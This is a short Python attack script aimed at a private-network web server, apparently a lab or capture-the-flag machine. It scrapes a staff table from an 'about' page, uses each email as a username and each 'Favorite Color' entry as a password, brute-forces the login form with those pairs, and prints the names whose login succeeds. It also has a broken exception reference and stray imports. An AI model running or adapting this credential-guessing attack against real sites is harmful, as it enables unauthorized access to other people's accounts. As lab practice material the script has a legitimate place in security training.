#!/usr/bin/python3
#object
from cmath import e
from distutils.extension import Extension
from logging import exception
from urllib.error import HTTPError
from bs4 import BeautifulSoup
import requests
import pandas as pd
ip="192.168.184.68"
port=":8080"

about="http://"+ip+port+"/about.html"
login="http://"+ip+port+"/login-3/"

reqAbout=requests.get(about)

df=pd.read_html(reqAbout.content)

parse=df[-1].to_dict()
print(parse)
emails=parse.get("Email")
creds=parse.get("Favorite Color")
firstname=parse.get("First Name")

for email in emails:
    info={
        "username":emails.get(email),
        "password":creds.get(email)
    }
    try:
        reqLogin=requests.post(login,data=info)
        reqLogin.raise_for_status()
        if "No Such User." not in reqLogin.text:
            print(firstname.get(email))
    except requests.exception.HTTPError as err:
        print(err)

    
